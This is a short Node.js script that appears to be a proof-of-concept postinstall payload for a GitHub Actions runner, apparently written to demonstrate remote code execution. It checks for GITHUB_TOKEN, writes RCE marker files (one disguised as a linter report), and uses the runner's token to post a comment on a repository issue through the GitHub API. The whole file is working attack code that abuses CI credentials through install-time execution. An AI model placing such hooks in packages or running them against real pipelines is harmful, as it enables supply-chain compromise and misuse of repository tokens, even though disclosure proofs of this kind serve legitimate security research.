const fs = require('fs');
const marker = 'RCE_CONFIRMED_' + Date.now();
console.log('RCE_MARKER_EXECUTED ' + marker);
console.log('TOKEN_PRESENT=' + (process.env.GITHUB_TOKEN ? 'yes' : 'no'));
console.log('REPO=' + (process.env.GITHUB_REPOSITORY || 'none'));
const ws = process.env.GITHUB_WORKSPACE || process.cwd();
try {
  fs.writeFileSync(ws + '/linter-report.txt', 'RCE_CONFIRMED_BY_CODE_EXECUTION ' + marker + '\n');
  fs.writeFileSync('/tmp/ADP_RCE_MARKER', 'executed');
} catch (e) { console.log('workspace write failed: ' + e.message); }
(async () => {
  try {
    const t = process.env.GITHUB_TOKEN;
    if (!t) return;
    const r = await fetch('https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY + '/issues/2/comments', {
      method: 'POST',
      headers: { authorization: 'Bearer ' + t, accept: 'application/vnd.github+json', 'content-type': 'application/json' },
      body: JSON.stringify({ body: 'TOKEN_USE_PROOF_FROM_POSTINSTALL ' + marker })
    });
    console.log('token_comment_status=' + r.status);
  } catch (e) { console.log('token comment failed: ' + e.message); }
})();
